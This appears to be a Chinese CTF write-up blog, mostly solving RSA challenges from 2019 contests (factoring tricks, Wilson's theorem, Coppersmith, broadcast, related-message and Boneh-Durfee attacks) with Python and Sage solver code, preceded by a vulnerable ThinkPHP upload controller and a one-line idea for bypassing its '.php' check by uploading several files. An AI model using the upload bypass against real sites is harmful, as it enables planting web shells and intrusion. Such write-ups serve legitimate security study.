<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>思路: 由于只对’file’文件做判断, 所以一旦上传多个文件就可以绕过,然后根据文件名的生成方式来爆破php文件位置.</p>
<h1>crypto</h1>
<h2 id="RSA">RSA</h2>
<p>题目给出了条件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127L</span><br><span class="line"></span><br><span class="line">e=0x10001</span><br><span class="line"></span><br><span class="line">(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x=2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724L</span><br><span class="line"></span><br><span class="line">p=gmpy2.next_prime(x*y*z)</span><br><span class="line"></span><br><span class="line">q=gmpy2.next_prime(z)</span><br><span class="line"></span><br><span class="line">c=104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422L</span><br></pre></td></tr></table></figure>
<p>因为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2**(2019) &gt; 26833491826787145242474...1422L</span><br></pre></td></tr></table></figure>
<p>所以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((y%x)**5)%(x%y) = 1 或者 0</span><br></pre></td></tr></table></figure>
<p>所以将这项忽略,再将(y+1)/x忽略</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">y 约等于26833491826787145242474...1422L的316次方</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">y 约等于83</span><br></pre></td></tr></table></figure>
<p>然后(y+1)/x 必须为整数 ,结合上述条件可以轻易求得x=2.y=83</p>
<p>接下来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p = xyz + a</span><br><span class="line">q = z + b</span><br><span class="line">xyzz + xyzb + az + ab = n</span><br></pre></td></tr></table></figure>
<p>忽略ab, az, xyzb, 求出z的近似值,然后这个值肯定比真实的z要大, 因此可以根据这个值循环减一带入运算来爆破p ,求出的p如果可以整除n就停下.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127L</span></span><br><span class="line"></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422L</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  x=2</span></span><br><span class="line"><span class="comment">#  y = 83</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  z_close = gmpy2.iroot(n//166, 2)</span></span><br><span class="line">z_close = <span class="number">842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458023</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p_close = gmpy2.next_prime(<span class="number">166</span>*z_close)</span><br><span class="line">    <span class="keyword">if</span> n % p_close == <span class="number">0</span>:</span><br><span class="line">        p = p_close</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    z_close -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  p = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183 </span></span><br><span class="line"><span class="comment">#  q = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569</span></span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> number.long_to_bytes(pow(c,d,n))</span><br></pre></td></tr></table></figure>
<h2 id="babyrsa">babyrsa</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myGetPrime</span><span class="params">()</span>:</span></span><br><span class="line">    A= getPrime(<span class="number">513</span>)</span><br><span class="line">    print(A)</span><br><span class="line">    B=A-random.randint(<span class="number">1e3</span>,<span class="number">1e5</span>)</span><br><span class="line">    print(B)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextPrime((B!)%A)</span><br><span class="line"></span><br><span class="line">p=myGetPrime()</span><br><span class="line"><span class="comment">#A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span></span><br><span class="line"><span class="comment">#B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span></span><br><span class="line"></span><br><span class="line">q=myGetPrime()</span><br><span class="line"><span class="comment">#A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span></span><br><span class="line"><span class="comment">#B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span></span><br><span class="line"></span><br><span class="line">r=myGetPrime()</span><br><span class="line"></span><br><span class="line">n=p*q*r</span><br><span class="line"><span class="comment">#n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span></span><br><span class="line">c=pow(flag,e,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#e=0x1001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#so,what is the flag?</span></span><br></pre></td></tr></table></figure>
<p>直接求b的阶乘是不可能的,递归达到最大限制次数也求不出来.</p>
<p>这里要用到威尔逊定理</p>
<blockquote>
<p>判定一个数字是素数的充分必要条件:</p>
<p>(p-1)! = -1 (mod p)</p>
</blockquote>
<p>在这套题中可以发现<code>(-1)(A-1)(A-2)...(B+2)(B+1)</code>是<code>B!</code> 关于A的逆元,然后就好求了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myprime</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    ans = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(b+<span class="number">1</span>, a):</span><br><span class="line">        ans = (ans *i) % a</span><br><span class="line">    ans = <span class="number">-1</span> * ans</span><br><span class="line">    num = gmpy2.invert(ans ,a)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A1=<span class="number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span></span><br><span class="line">B1=<span class="number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span></span><br><span class="line"></span><br><span class="line">p = myprime(A1, B1)</span><br><span class="line"></span><br><span class="line">A2=<span class="number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span></span><br><span class="line">B2=<span class="number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span></span><br><span class="line"></span><br><span class="line">q = myprime(A2, B2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span></span><br><span class="line"></span><br><span class="line">enc=<span class="number">75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span></span><br><span class="line"></span><br><span class="line">r = n /(p*q)</span><br><span class="line">e=<span class="number">0x1001</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)*(r<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = pow(enc, d, n)</span><br><span class="line"><span class="keyword">print</span> number.long_to_bytes(m)</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>copperstudy-record</title>
    <url>/2019/12/19/qwb-copperstudy-record/</url>
    <content><![CDATA[<h2 id="强网杯-2019-copperstudy">强网杯 2019 copperstudy</h2>
<p>拖拖拉拉终于把这题复现了…</p>
<p>开局计算哈希, 爆破爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">26182</span>)</span><br><span class="line">r.recvuntil(<span class="string">"hexdigest()="</span>)</span><br><span class="line">digest = r.recvline()</span><br><span class="line">r.recvuntil(<span class="string">"'hex')="</span>)</span><br><span class="line">skr5 = r.recvline()[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof</span><span class="params">(skr5, digest)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>*<span class="number">256</span>*<span class="number">256</span>, <span class="number">256</span>*<span class="number">256</span>*<span class="number">256</span>):</span><br><span class="line">        result = hashlib.sha256(skr5.decode(<span class="string">'hex'</span>) + long_to_bytes(i)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> result == digest:</span><br><span class="line">            print(<span class="string">"found it!"</span>)</span><br><span class="line">            <span class="keyword">return</span> ((skr5.decode(<span class="string">'hex'</span>)+long_to_bytes(i)).encode(<span class="string">'hex'</span>))</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">skr = proof(skr5, digest)</span><br><span class="line">r.recvuntil(<span class="string">"encode('hex')="</span>)</span><br><span class="line">r.sendline(skr)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="challenge1">challenge1</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n</span><br><span class="line">e</span><br><span class="line">c</span><br><span class="line">m的高位</span><br></pre></td></tr></table></figure>
<p>解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">13112061820685643239663831166928327119579425830632458568801544406506769461279590962772340249183569437559394200635526183698604582385769381159563710823689417274479549627596095398621182995891454516953722025068926293512505383125227579169778946631369961753587856344582257683672313230378603324005337788913902434023431887061454368566100747618582590270385918204656156089053519709536001906964008635708510672550219546894006091483520355436091053866312718431318498783637712773878423777467316605865516248176248780637132615807886272029843770186833425792049108187487338237850806203728217374848799250419859646871057096297020670904211</span> </span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">15987554724003100295326076036413163634398600947695096857803937998969441763014731720375196104010794555868069024393647966040593258267888463732184495020709457560043050577198988363754703741636088089472488971050324654162166657678376557110492703712286306868843728466224887550827162442026262163340935333721705267432790268517</span></span><br><span class="line">m_high = <span class="number">2519188594271759205757864486097605540135407501571078627238849443561219057751843170540261842677239681908736</span></span><br><span class="line"></span><br><span class="line">kbits = <span class="number">72</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (m_high + x)^e - c</span><br><span class="line">solv = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">print(<span class="string">"x: %s"</span> % hex(int(solv)))</span><br></pre></td></tr></table></figure>
<h3 id="challenge2">challenge2</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n</span><br><span class="line">e</span><br><span class="line">c</span><br><span class="line">p的高位</span><br></pre></td></tr></table></figure>
<p>能在n的因子的整数域中等于0也可以构造方程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n=<span class="number">12784625729032789592766625203074018101354917751492952685083808825504221816847310910447532133616954262271205877651255598995305639194329607493047941212754523879402744065076183778452640602625242851184095546100200565113016690161053808950384458996881574266573992526357954507491397978278604102524731393059303476350167738237822647246425836482533150025923051544431330502522043833872580483142594571802189321599016725741260254170793393777293145010525686561904427613648184843619301241414264343057368192416551134404100386155751297424616254697041043851852081071306219462991969849123668248321130382231769250865190227630009181759219</span> </span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">627824086157119245056478875800598959553774250161670787506083253960788230737588761787385686125828765665617567887904228030839535317987589608761534500003128247164233774794784231518212804270056404565710426613938264302998015421153393879729263551292024543756422702956470022959537221269172084619081368498693930550456153543628170306324206266216348386707008661128717431426237486511309767286175518238620230507201952867261283880986868752676549613958785288914989429224582849218395471672295410036858881836363364885164276983237312235831591858044908369376855484127614933545955544787160352042318378588039587911741028067576722790778</span></span><br><span class="line">p_high128 = <span class="number">97522826022187678545924975588711975512906538181361325096919121233043973599759518562689050415761485716705615149641768982838255403594331293651224395590747133152128042950062103156564440155088882592644046069208405360324372057140890317518802130081198060093576841538008960560391380395697098964411821716664506908672</span></span><br><span class="line"></span><br><span class="line">pbits = <span class="number">128</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = p_high128 + x</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^pbits, beta=<span class="number">0.3</span>)[<span class="number">0</span>]</span><br><span class="line">p = p_high128 + int(x0)</span><br><span class="line">q = n // p</span><br><span class="line">print(<span class="string">"p: %s"</span> % p)</span><br><span class="line">print(<span class="string">"q: %s"</span> % q)</span><br></pre></td></tr></table></figure>
<p>然后解出明文即可</p>
<h3 id="challenge3">challenge3</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n</span><br><span class="line">e</span><br><span class="line">c</span><br><span class="line">d的低512位</span><br></pre></td></tr></table></figure>
<p>就硬套</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial_p</span><span class="params">(p0, kbits, n)</span>:</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.2</span>) </span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span><span class="params">(d0, kbits, e, n)</span>:</span></span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    n=<span class="number">92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183</span></span><br><span class="line">    e=<span class="number">3</span></span><br><span class="line">    c=<span class="number">56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530</span></span><br><span class="line">    d = <span class="number">787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955</span></span><br><span class="line"></span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = <span class="number">512</span></span><br><span class="line">    d0 = d &amp; (<span class="number">2</span>^kbits<span class="number">-1</span>)</span><br><span class="line">    p = find_p(d0, kbits, e, n)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found p: %d"</span> %p</span><br><span class="line">    q = n // p</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"d: %d"</span> % inverse_mod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br></pre></td></tr></table></figure>
<p>解出明文发送</p>
<h3 id="challenge4">challenge4</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n1</span><br><span class="line">c1</span><br><span class="line">n2</span><br><span class="line">c2</span><br><span class="line">n3</span><br><span class="line">c3</span><br><span class="line">e=3</span><br></pre></td></tr></table></figure>
<p>常规的广播攻击, 使用中国剩余定理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">n1=<span class="number">78642188663937191491235684351005990853149481644703243255021321296087539054265733392095095639539412823093600710316645130404423641473150336492175402885270861906530337207734106926328737198871118125840680572148601743121884788919989184318198417654263598170932154428514561079675550090698019678767738203477097731989</span></span><br><span class="line">c1=<span class="number">23419685303892339080979695469481275906709035609088426118328601771163101123641599051556995351678670765521269546319724616458499631461037359417701720430452076029312714313804716888119910334476982840024696320503747736428099717113471541651211596481005191146454458591558743268791485623924245960696651150688621664860</span></span><br><span class="line">n2=<span class="number">98174485544103863705821086588292917749386955237408645745685476234349659452606822650329076955303471252833860010724515777826660887118742978051231030080666542833950748806944312437614585352818344599399156268450521239843157288915059003487783576003027303399985723834248634230998110618288843582573006048070816520647</span></span><br><span class="line">c2=<span class="number">72080679612442543693944655041130370753964497034378634203383617624269927191363529233872659451561571441107920350406295389613006330637565645758727103723546610079332161151567096389071050158035757745766399510575237344950873632114050632573903701015749830874081198250578516967517980592506626547273178363503100507676</span></span><br><span class="line">n3=<span class="number">91638855323231795590642755267985988356764327384001022396221901964430032527111968159623063760057482761918901490239790230176524505469897183382928646349163030620342744192731246392941227433195249399795012672172947919435254998997253131826888070173526892674308708289629739522194864912899817994807268945141349669311</span></span><br><span class="line">c3=<span class="number">22149989692509889061584875630258740744292355239822482581889060656197919681655781672277545701325284646570773490123892626601106871432216449814891757715588851851459306683123591338089745675044763551335899599807235257516935037356212345033087798267959242561085752109746935300735969972249665700075907145744305255616</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(gmpy2.gcd(n1, n2)==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span>(gmpy2.gcd(n1, n3)==<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chinese_remainder</span><span class="params">(N, C)</span>:</span></span><br><span class="line">    all_n = reduce(<span class="keyword">lambda</span> a,b: a*b, N)</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(C)):</span><br><span class="line">        ni = all_n // N[i]</span><br><span class="line">        ni_inv = gmpy2.invert(ni, N[i])</span><br><span class="line">        result += ni_inv * C[i] * ni</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result % all_n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = [n1, n2, n3]</span><br><span class="line">C = [c1, c2, c3]</span><br><span class="line"></span><br><span class="line">result = chinese_remainder(N, C)</span><br><span class="line">all_n = reduce(<span class="keyword">lambda</span> a,b: a*b, N)</span><br><span class="line"><span class="comment"># print all_n</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    root, exact = gmpy2.iroot(result+i*all_n, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> exact:</span><br><span class="line">        <span class="keyword">print</span> root</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    i+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="challenge5">challenge5</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c = encrypt(m)</span><br><span class="line">x = encrypt(m+1)</span><br><span class="line">n</span><br><span class="line">e=3</span><br></pre></td></tr></table></figure>
<p>相关消息攻击, 套ctfwiki的公式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p1=<span class="number">1</span></span><br><span class="line">p2=<span class="number">0</span></span><br><span class="line">c2 =<span class="number">112992730284209629010217336632593897028023711212853788739137950706145189880318698604512926758021533447981943498594790549326550460216939216988828130624120379925895123186121819609415184887470233938291227816332249857236198616538782622327476603338806349004620909717360739157545735826670038169284252348037995399308</span></span><br><span class="line">c1 =<span class="number">112992730284209629010217336632593897028023711212853788739137950706145189880318698604512926758021552486915464025361447529153776277710423467951041523831865232164370127602772602643378592695459331174613894578701940837730590029577336924367384969935652616989527416027725713616493815764725131271563545176286794438175</span></span><br><span class="line">n =<span class="number">113604829563460357756722229849309932731534576966155520277171862442445354404910882358287832757024693652075211204635679309777620586814014894544893424988818766425089667672311645586528776360047956843961901352792631908859388801090108188344342619580661377758180391734771694803991493164412644148805229529911069578061</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = p1-p2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getmessage</span><span class="params">(a, b, c1, c2, n)</span>:</span></span><br><span class="line">    b3 = gmpy2.powmod(b, <span class="number">3</span>, n)</span><br><span class="line">    part1 = b * (c1 + <span class="number">2</span> * c2 - b3) % n</span><br><span class="line">    part2 = a * (c1 - c2 + <span class="number">2</span> * b3) % n</span><br><span class="line">    part2 = gmpy2.invert(part2, n)</span><br><span class="line">    <span class="keyword">return</span> part1 * part2 % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = getmessage(a, b, c1, c2, n) -p2</span><br><span class="line"><span class="keyword">print</span> message</span><br><span class="line">message = hex(message)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> message</span><br></pre></td></tr></table></figure>
<h3 id="challenge6">challenge6</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e</span><br><span class="line">c</span><br><span class="line">n</span><br><span class="line">assert(d&lt;n的0.27次方)</span><br></pre></td></tr></table></figure>
<p>只要d小于n的0.292次方就有<code>Boneh and Durfee attack</code></p>
<p><a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage" target="_blank" rel="noopener">https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage</a></p>
<p>改改数据, 跑一下就有了</p>
<h3 id="整合">整合</h3>
